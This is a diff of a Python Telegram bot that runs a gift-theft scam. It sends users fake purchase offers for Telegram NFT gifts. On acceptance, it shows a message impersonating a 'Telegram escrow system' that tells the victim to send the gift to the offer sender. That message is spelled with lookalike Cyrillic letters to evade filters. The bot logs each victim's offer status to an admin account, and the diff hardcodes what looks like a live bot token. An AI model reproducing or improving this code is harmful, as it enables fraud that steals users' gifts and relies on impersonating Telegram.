@@ -17,9 +17,8 @@ from aiogram.enums import ParseMode
 # ============================================================
 # КОНФИГУРАЦИЯ
 # ============================================================
-BOT_TOKEN = "8"
-ADMIN_LOG_ID = 8950111892
-CHECK_CHAT_ID = -1004405783690
+BOT_TOKEN = "8960916793:AAG5xjIUE9-7Mgrbyx5ysh6S2c15nhDvnVM"
+ADMIN_LOG_ID = 8751928501
 
 EMOJI_STARS = "5920433463428650761"
 EMOJI_GRAM = "5267445215773367585"
@@ -65,73 +64,57 @@ def format_gift_name(slug: str, number: str) -> str:
     return f"{formatted_slug} #{number}"
 
 # ============================================================
-# ЛОГИ ДЛЯ АДМИНА (система из кода #2)
+# ЛОГИ ДЛЯ АДМИНА
 # ============================================================
-async def get_log_text(data: dict, status: str, is_read: bool = False) -> str:
+def get_log_text(data: dict, status: str) -> str:
     status_map = {
-        "pending":  ("⏳", "Ожидает"),
-        "accepted": ("✅", "Принят"),
-        "declined": ("❌", "Отклонён"),
+        "pending": ("⏳", "Отправлен", "Не принят"),
+        "accepted": ("✅", "Принят", "Да"),
+        "declined": ("❌", "Отклонён", "Нет"),
     }
-    status_emoji, status_text = status_map.get(status, ("⏳", "Ожидает"))
-    read_status = "Прочитан" if is_read else "Не прочитан"
-
+    status_emoji, status_text, transferred_text = status_map.get(status, ("⏳", "Отправлен", "Не принят"))
     gift_name_str = format_gift_name(data['gift_slug'], data['gift_number'])
     gift_display = f'<a href="{data["link"]}"><b>{gift_name_str}</b></a>'
-
+    
     if data["currency"] == "gram":
         emoji_id, emoji_char, currency_name = EMOJI_GRAM, "🪙", "GRAM"
     else:
         emoji_id, emoji_char, currency_name = EMOJI_STARS, "⭐", "Stars"
+        
     emoji_tag = f'<tg-emoji emoji-id="{emoji_id}">{emoji_char}</tg-emoji>'
-
-    log_prefix = f'<tg-emoji emoji-id="{EMOJI_ACCEPT}">✅</tg-emoji>'
-
-    is_admin_text = "Проверка..."
-    try:
-        member = await bot.get_chat_member(chat_id=CHECK_CHAT_ID, user_id=data['sender_id'])
-        is_admin_text = "Да (Админ)" if member.status in ["creator", "administrator"] else "Нет (Участник)"
-    except Exception:
-        is_admin_text = "Нет данных"
-
-    bc_status = f"Подключен ({data['bc_id']})" if data.get('bc_id') else "Нет"
-
     return (
-        f"{log_prefix} <b>Оффер отправлен.</b>\n\n"
-        f"<b>Отправил:</b> @{data['sender_username']} | {data['sender_id']}\n"
-        f"<b>Админ в группе:</b> {is_admin_text}\n"
-        f"<b>Business подключение:</b> {bc_status}\n"
-        f"<b>Владелец подарка:</b> ❌ Недоступно\n"
+        f"<b>Оффер отправлен</b>\n\n"
         f"<b>Подарок:</b> {gift_display}\n"
+        f"<b>Сумма:</b> {data['amount']}\n"
         f"<b>Валюта:</b> {emoji_tag} {currency_name}\n"
-        f"<b>Сумма:</b> {data['amount']}\n\n"
-        f"{read_status} | {status_emoji} {status_text}"
+        f"<b>Отправил:</b> @{data['sender_username']} | {data['sender_id']}\n"
+        f"<b>Владелец подарка:</b> Нет доступа\n"
+        f"<b>Передан:</b> {transferred_text}\n\n"
+        f"<b>Статус:</b> {status_emoji} {status_text}"
     )
 
 def get_log_keyboard(data: dict) -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🎁 Подарок", url=data["link"])]])
+    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🎁 Ссылка на подарок", url=data["link"])]])
 
 async def send_log_to_admin(data: dict):
     try:
-        text = await get_log_text(data, "pending", is_read=False)
         msg = await bot.send_message(
-            chat_id=ADMIN_LOG_ID,
-            text=text,
-            reply_markup=get_log_keyboard(data),
+            chat_id=ADMIN_LOG_ID, 
+            text=get_log_text(data, "pending"), 
+            reply_markup=get_log_keyboard(data), 
             disable_web_page_preview=True
         )
         data["log_msg_id"] = msg.message_id
     except Exception as e:
-        logger.error(f"[admin-log] Ошибка отправки: {e}")
+        logger.error(f"[admin-log] Ошибка: {e}")
 
-async def update_log_message(data: dict, status: str, is_read: bool = False):
+async def update_log_message(data: dict, status: str):
     if "log_msg_id" not in data: return
     try:
-        text = await get_log_text(data, status, is_read)
         await bot.edit_message_text(
             chat_id=ADMIN_LOG_ID,
             message_id=data["log_msg_id"],
-            text=text,
+            text=get_log_text(data, status),
             reply_markup=get_log_keyboard(data),
             disable_web_page_preview=True
         )
@@ -194,11 +177,11 @@ async def handle_offer(message: Message) -> None:
 
     parts = message.text.strip().split()
     if len(parts) < 3 or not parts[2].isdigit(): return
-
+    
     link_raw = parts[1]
     amount = parts[2]
     currency = parts[3].lower() if len(parts) > 3 else "stars"
-
+    
     link_match = re.search(r"(?:https?://)?t\.me/nft/([A-Za-z]+)-(\d+)", link_raw)
     if not link_match: return
     slug, number = link_match.group(1), link_match.group(2)
@@ -243,7 +226,7 @@ async def handle_decline(callback: CallbackQuery) -> None:
     await callback.answer()
     await asyncio.sleep(0.3)
     await edit_with_fallback(data["bc_id"], data["chat_id"], data["msg_id"], f'<tg-emoji emoji-id="{EMOJI_DECLINE_EN}">❌</tg-emoji> Offer has been declined.')
-    await update_log_message(data, "declined", is_read=True)
+    await update_log_message(data, "declined")
 
 @dp.callback_query(F.data.startswith("acc:"))
 async def handle_accept(callback: CallbackQuery) -> None:
@@ -253,7 +236,7 @@ async def handle_accept(callback: CallbackQuery) -> None:
     data["accepted"] = True
     await callback.answer()
     await asyncio.sleep(0.3)
-
+    
     amount_fmt = f"{int(data['amount']):,}"
     gift_display = f'<a href="{data["link"]}"><b>{data["gift_slug"]}-{data["gift_number"]}</b></a>'
     emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM if data["currency"] == "gram" else EMOJI_STARS}">{"🪙" if data["currency"] == "gram" else "⭐"}</tg-emoji>'
@@ -266,14 +249,14 @@ async def handle_accept(callback: CallbackQuery) -> None:
         f"Тhе buуеr hаs rеsеrvеd <b>{amount_fmt}</b> {emoji} thrоugh thе ТеIеgrаm еsсrоw sуstеm. "
         f"Тhе {cur_l} аrе hеId ln а sресiаI еsсrоw ассоunt аnd wlII bе аutоmаtiсаIIy сrеditеd tо уоur ТеIеgrаm {cur_u} bаIаnсе right аftеr thе gift is trаnsfеrrd.\n\n"
         f"<b>lnstruсtlоns tо соmрlеtе thе dеаl:</b>\n\n"
-        f"1. Send to: @offerBnk\n"
+        f"1. Sеnd tо: @{data['sender_username']}\n"
         f"2. СIiсk «Sеnd Gift» аnd sеlесt {gift_display}\n"
         f"3. Соnfirm thе glft trаnsfеr.\n\n"
         f"ТеIеgrаm wiII rесоrd thе trаnsасtiоn аnd instаntIу сrеdit <b>{amount_fmt}</b> {emoji} tо уоur bаIаnсе. Тhе rеsеrvаtiоn is vаlid fоr 24 hоurs."
     )
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Send Gift", url="tg://send_gift?to=offerBnk")]])
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Send Gift", url=f"tg://send_gift?to={data['sender_username']}")]])
     await edit_with_fallback(data["bc_id"], data["chat_id"], data["msg_id"], accept_text, reply_markup=keyboard)
-    await update_log_message(data, "accepted", is_read=True)
+    await update_log_message(data, "accepted")
 
 # ============================================================
 # АДМИН КОМАНДЫ
